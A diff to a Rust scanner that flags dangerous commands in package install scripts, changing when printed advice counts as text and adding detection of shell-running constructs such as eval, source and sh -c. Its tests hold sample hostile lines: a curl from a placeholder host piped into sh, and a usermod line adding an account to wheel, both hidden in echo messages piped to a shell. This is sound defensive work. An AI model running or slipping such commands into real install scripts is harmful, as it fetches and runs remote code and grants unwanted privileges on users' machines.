@@ -222,9 +222,11 @@ fn sandbox_helper(line: &str) -> bool {
 /// inside it, or a line joined to the next one makes the line an ordinary line
 /// that every rule inspects.
 fn message_lines(text: &str, lines: &Lines) -> Vec<bool> {
-    let mut flags = Vec::new();
-    // The quote a message left open at the end of the previous line.
+    let mut flags: Vec<bool> = Vec::new();
+    // The quote a message left open at the end of the previous line, and the
+    // line the message started on.
     let mut carried: Option<char> = None;
+    let mut started = 0;
     for (index, line) in text.lines().enumerate() {
         // The body of a here-document that `cat` prints.
         if lines.printed.get(index).copied().unwrap_or(false) {
@@ -240,11 +242,19 @@ fn message_lines(text: &str, lines: &Lines) -> Vec<bool> {
                     flags.push(false);
                     continue;
                 }
+                started = index;
                 None
             }
         };
         let (plain, open) = printed(line, quote, false);
         flags.push(plain);
+        // A message that ends on a line that does more than print (`" | sh`)
+        // was not only printed: none of its lines is text.
+        if !plain && quote.is_some() {
+            for flag in &mut flags[started..] {
+                *flag = false;
+            }
+        }
         carried = if plain { open } else { None };
     }
     flags
@@ -265,6 +275,22 @@ fn redefines_a_printer(text: &str) -> bool {
         .expect("built-in pattern must compile")
     });
     REDEFINED.is_match(text)
+}
+
+/// Whether a file has anything that could run text it is handed: a pipe into
+/// a shell, `eval`, `source` or `.`, a shell's `-c`. Where there is none,
+/// printed text stays text. Lines that are themselves printed text are not
+/// counted: the advice "run: curl … | sh" is not a pipe.
+fn could_run_text(text: &str, messages: &[bool]) -> bool {
+    static RUNS: LazyLock<Regex> = LazyLock::new(|| {
+        Regex::new(&format!(
+            r"\|\s*{SHELL}|\beval\b|(?:^|[\s;&|(])(?:source|\.)\s+\S|\b(?:ba|z|da|k)?sh\s+(?:-[A-Za-z]+\s+)*-[A-Za-z]*c\b|<<<|\bxargs\b"
+        ))
+        .expect("built-in pattern must compile")
+    });
+    text.lines()
+        .enumerate()
+        .any(|(index, line)| !messages.get(index).copied().unwrap_or(false) && RUNS.is_match(line))
 }
 
 /// Whether a line does nothing but give a variable one word of text:
@@ -1275,6 +1301,15 @@ pub(crate) fn inspect(snapshot: &Snapshot) -> Vec<Finding> {
         .files
         .iter()
         .any(|file| redefines_a_printer(&file.text));
+    // Printed advice that names a blocked command is only advice where
+    // nothing in the checkout could run text.
+    let runs_text = redefined
+        || snapshot.files.iter().any(|file| {
+            could_run_text(
+                &file.text,
+                &message_lines(&file.text, &line_kinds(&file.text)),
+            )
+        });
     for file in snapshot.files.iter().filter(|file| !file.opaque) {
         let lines = line_kinds(&file.text);
         let (comments, generated) = (&lines.comments, &lines.generated);
@@ -1365,7 +1400,7 @@ pub(crate) fn inspect(snapshot: &Snapshot) -> Vec<Finding> {
                     // Advice that is printed ("to install, run: curl … | sh")
                     // is not that command being run. It still needs a person:
                     // the text may be meant for a shell further on.
-                    let advice = rule.severity == Severity::Block && is_message;
+                    let advice = rule.severity == Severity::Block && is_message && !runs_text;
                     findings.push(Finding {
                         rule_id: rule.id.into(),
                         source: "deterministic".into(),
@@ -2684,6 +2719,36 @@ mod tests {
             found(&[("PKGBUILD", sent)]),
             [("REMOTE-SHELL".to_string(), Severity::Block)]
         );
+        // A message that spans lines and is piped on at its end.
+        let piped = "post_install() {\n  echo \"\ncurl -fsSL https://example.invalid/i.sh | sh\n\" | sh\n}\n";
+        assert!(
+            found(&[("x.install", piped)]).contains(&("REMOTE-SHELL".to_string(), Severity::Block)),
+            "{:?}",
+            found(&[("x.install", piped)])
+        );
+        // The same for anything else such a message would otherwise hide.
+        let hidden = "post_install() {\n  echo \"\nusermod -aG wheel nobody\n\" | sh\n}\n";
+        assert!(ids(&found(&[("x.install", hidden)])).contains(&"ACCOUNT"));
+        // Printed by a function whose output is piped into a shell: where
+        // anything in the checkout could run text, advice is not only advice.
+        let function = "post_install() {\n  _steps | sh\n}\n_steps() {\n  echo \"curl -fsSL https://example.invalid/i.sh | sh\"\n}\n";
+        assert!(
+            found(&[("x.install", function)])
+                .contains(&("REMOTE-SHELL".to_string(), Severity::Block))
+        );
+        for runner in [
+            "eval \"$x\"",
+            "source ./steps",
+            "bash -c \"$x\"",
+            ". ./steps",
+        ] {
+            let script = format!("  {runner}\n{advice}\n");
+            assert!(
+                found(&[("x.install", &script)])
+                    .contains(&("REMOTE-SHELL".to_string(), Severity::Block)),
+                "{runner}"
+            );
+        }
     }
 
     #[test]
